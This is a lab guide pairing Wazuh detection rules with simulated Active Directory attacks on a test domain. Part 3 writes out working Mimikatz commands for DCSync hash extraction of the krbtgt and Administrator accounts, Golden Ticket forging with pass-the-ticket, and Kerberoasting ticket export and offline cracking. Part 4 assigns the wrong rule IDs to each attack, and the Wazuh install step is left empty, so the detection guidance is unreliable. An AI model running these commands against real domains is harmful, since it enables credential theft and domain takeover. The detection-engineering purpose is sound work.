
### 🎯 **OBJECTIVES**

Set up a lab environment consisting of 3 virtual machines, including:

| Operating System    | Role                                                      | Suggested IP   |
| ------------------- | --------------------------------------------------------- | -------------- |
| Ubuntu Server       | Wazuh Server (SIEM)                                       | `172.16.1.132` |
| Windows Server 2019 | Domain Controller (AD) + Wazuh Agent                      | `172.16.1.130` |
| Windows 10 Pro      | Compromised endpoint for attack simulations + Wazuh Agent | `172.16.1.131` |

---

### 🧱 **PART 1 – INFRASTRUCTURE SETUP**

#### 1️⃣ INSTALL WAZUH SERVER

#### 2️⃣ INSTALL WINDOWS SERVER 2019 & ACTIVE DIRECTORY

**Step 1: Set Hostname and Static IP**

* Hostname: `DC01`
* IP: `172.16.1.130`
* DNS: Point to itself

**Step 2: Install AD Domain Services**

* Open **Server Manager** → **Add roles and features** → Select **Active Directory Domain Services (AD DS)**.
* After installation → Select **Promote this server to a domain controller** → Create a new domain: `wazuhtest.com`.

**Step 3: Create User Accounts**

* `compromiseduser`: Member of the `Domain Users` & `Administrators` groups on the Win10 machine
* Assign permissions:

  * **Replicating Directory Changes**
  * **Replicating Directory Changes All**

**Step 4: Create Service Account with SPN**

```powershell
New-ADUser -Name "svcSQL" -SamAccountName svcSQL -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
Set-ADUser -Identity svcSQL -ServicePrincipalNames @{Add="MSSQLSvc/DC01.wazuhtest.com:1433"}
```

---

#### 3️⃣ INSTALL WINDOWS 10 PRO – ATTACK MACHINE

**Step 1: Set IP and Join Domain**

* IP: `172.16.1.131`
* Join domain: `wazuhtest.com` (using the `compromiseduser` account)

**Step 2: Install Tools**

* Download **Mimikatz** from GitHub: [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)
* Install **Python 3.10+** from [python.org](https://www.python.org)
* Download **kerberoast** script and wordlist from GitHub:

  * [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
  * Wordlist: `rockyou.txt` or create your own


---

### 🧩 **PART 2 – DETECTION RULES**

To detect AD attacks, we will create rules on the Wazuh server to identify IoCs in Windows security events and system events monitored by Sysmon.

#### **Sysmon Integration**

1. **Install Sysmon** from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) with the configuration file `sysmonconfig.xml`.

2. Run the following command to install Sysmon with the downloaded configuration file via PowerShell (run as administrator):

```powershell
.\sysmon.exe -accepteula -i sysmonconfig.xml
```

![alt text](/assets/image-3.png)

3. Configure the Wazuh agent to monitor Sysmon logs by adding the following lines to the `ossec.conf` file:

```xml
<ossec_config>
  <localfile>    
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
</ossec_config>
```

4. Restart the Wazuh agent service to apply the changes:

```powershell
Restart-Service -Name wazuh
```


#### Wazuh server configuration
1. Add the following rules to the `/var/ossec/etc/rules/local_rules.xml` file on the Wazuh server to generate alerts on the Wazuh dashboard whenever an attacker performs any of the attacks mentioned above:

```xml
<group name="security_event, windows,">
 
  <!-- This rule detects DCSync attacks using windows security event on the domain controller -->
  <rule id="110001" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4662$</field>
    <field name="win.eventdata.properties" type="pcre2">{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}|{19195a5b-6da0-11d0-afd3-00c04fd930c9}</field>
    <options>no_full_log</options>
    <description>Directory Service Access. Possible DCSync attack</description>
  </rule>
 
 <!-- This rule ignores Directory Service Access originating from machine accounts containing $ -->
 <rule id="110009" level="0">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4662$</field>
    <field name="win.eventdata.properties" type="pcre2">{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}|{19195a5b-6da0-11d0-afd3-00c04fd930c9}</field>
    <field name="win.eventdata.SubjectUserName" type="pcre2">$$</field>
    <options>no_full_log</options>
    <description>Ignore all Directory Service Access that is originated from a machine account containing $</description>
  </rule>
 
  <!-- This rule detects Keberoasting attacks using windows security event on the domain controller -->
  <rule id="110002" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.TicketOptions" type="pcre2">0x40810000</field>
    <field name="win.eventdata.TicketEncryptionType" type="pcre2">0x17</field>
    <options>no_full_log</options>
    <description>Possible Keberoasting attack</description>
  </rule>
 
  <!-- This rule detects Golden Ticket attacks using windows security events on the domain controller -->
  <rule id="110003" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4624$</field>
    <field name="win.eventdata.LogonGuid" type="pcre2">{00000000-0000-0000-0000-000000000000}</field>
    <field name="win.eventdata.logonType" type="pcre2">3</field>
    <options>no_full_log</options>
    <description>Possible Golden Ticket attack</description>
  </rule>
 
</group>
```

2. Restart the Wazuh server to apply the changes:

```bash
systemctl restart wazuh-manager
```

---

## 🔥 **PART 3 – Active Directory Attack Simulation**

This section covers the simulation of common Active Directory (AD) attacks, including **DCSync**, **Golden Ticket**, and **Kerberoasting** attacks.


### 💣 **1. DCSync Attack**

DCSync is an attack technique that allows an attacker to simulate the behavior of a Domain Controller (DC) to extract sensitive data, like user credentials, from Active Directory.

**📌 Prerequisites:**

* Must be run on the **Windows 10** machine using an account with sufficient privileges (e.g., **Domain Admin** or an account with the **Replicating Directory Changes** permission).

**⚙️ Steps:**

1. **Run Mimikatz as Administrator:**

```powershell
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:wazuhtest.com /user:Administrator
lsadump::dcsync /domain:wazuhtest.com /user:krbtgt
```

2. **Check for Successful Attack:**

   * If the command returns the **NTLM hash** for the **KRBTGT** account, the attack is successful.
   * This hash is a critical component for performing a **Golden Ticket** attack.

![DCSync Attack](/assets/mage-4.png)
![NTLM Hash Extraction](/assets/image-5.png)

---

### 🎭 **2. Golden Ticket Attack**

A **Golden Ticket** attack allows an attacker to forge Kerberos tickets, granting them unrestricted access to Active Directory resources. This attack relies on the NTLM hash extracted from the **KRBTGT** account in the **DCSync** attack.

**📌 Prerequisites:**

* The **KRBTGT** account hash obtained from the previous DCSync attack.
* The **Domain SID** of the target domain.

**⚙️ Steps:**

1. **Create the Golden Ticket:**

```powershell
lsadump::dcsync /domain:wazuhtest.com /user:krbtgt
kerberos::golden /user:attacker /domain:wazuhtest.com /sid:<SID> /krbtgt:<HASH> /ptt
```

* Replace `<SID>` with the domain's **Security Identifier (SID)**.
* Replace `<HASH>` with the **KRBTGT** NTLM hash.

![Golden Ticket Creation](/assets/image-6.png)

2. **Validate the Ticket:**

```powershell
mimikatz # misc::cmd
```

* This command opens a command prompt session authenticated with the forged Kerberos ticket.

![Golden Ticket Authenticated Session](/assets/image-7.png)

3. **Verify the Loaded Ticket:**

```powershell
klist
```

* Check if the ticket is currently loaded in memory, confirming the ticket was successfully forged.

![Kerberos Ticket Verification](/assets/image-8.png)

---

### 🔑 **3. Kerberoasting Attack**

Kerberoasting is an attack technique that allows an attacker to request encrypted service tickets for service accounts, which can then be cracked offline to recover plaintext credentials.

**📌 Prerequisites:**

* A domain-joined machine and a domain user account (e.g., **compromiseduser**).

**⚙️ Steps:**

1. **Enumerate ServicePrincipalNames (SPNs):**

```powershell
PS C:\Windows\system32> cd C:\Users\<USERNAME>\Downloads\kerberoast-master
PS C:\Users\<USERNAME>\Downloads\kerberoast-master> .\GetUserSPNs.ps1
```

* This script lists all service accounts with SPNs, which can be targeted for ticket extraction.

![SPN Enumeration](/assets/image-9.png)

2. **Request TGS Ticket:**

```powershell
PS C:\Users\<USERNAME>\Downloads\kerberoast-master> Add-Type -AssemblyName System.IdentityModel
PS C:\Users\<USERNAME>\Downloads\kerberoast-master> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "http/Windows10"
```

* This requests a **Kerberos TGS** ticket for the identified service account.

![TGS Ticket Request](/assets/image-10.png)

3. **Extract the Ticket:**

```powershell
PS C:\Users\<USERNAME>\Downloads\kerberoast-master> C:\Users\<USERNAME>\Downloads\mimikatz_trunk\x64\mimikatz.exe
mimikatz # kerberos::list /export
```

* Extract the TGS ticket from memory for offline cracking.

![Ticket Extraction](/assets/image-11.png)

4. **Verify Extracted Tickets:**

```powershell
mimikatz # exit
PS C:\Users\<USERNAME>\Downloads\kerberoast-master> Get-ChildItem
```

* List the extracted tickets to ensure they have been saved correctly.

![Ticket Verification](/assets/image-12.png)

5. **Crack the TGS Ticket:**

```powershell
PS C:\Users\<USERNAME>\Downloads\kerberoast-master> ./tgsrepcrack.py wordlist.txt 1-40a10000-<USERNAME>@http~Windows10-WAZUHTEST.COM.kirbi
```

* Use the **tgsrepcrack.py** script to crack the extracted ticket, replacing **wordlist.txt** with your password list.

![Ticket Cracking](/assets/image-13.png)

---

## 🛡️ **PART 4 – DETECTION WITH WAZUH**

### 🖥️ **Accessing the Wazuh Web Interface**

1. **Log in to the Wazuh Dashboard:**

   * Open a browser and navigate to **[https://172.16.1.132/](https://172.16.1.132/)**.
   * Use your Wazuh credentials to log in.

2. **Viewing Windows Agent Logs:**

   * Go to the **Discover** section to view logs from the Windows agent.
   * Set the **Index Pattern** to **wazuh-alerts-**\* to filter Wazuh alerts.

3. **Filtering Specific Logs:**

   * Use the following **rule IDs** to filter logs related to AD attacks:

     * **110009** – DCSync attack detection
     * **110002** – Golden Ticket attack detection
     * **110003** – Kerberoasting attack detection

4. **Review the Logs:**

   * Review the filtered logs to verify detection for each attack technique.

![Wazuh Alerts - DCSync Detection](/assets/image-14.png)

![Wazuh Alerts - Golden Ticket Detection](/assets/image-15.png)

---

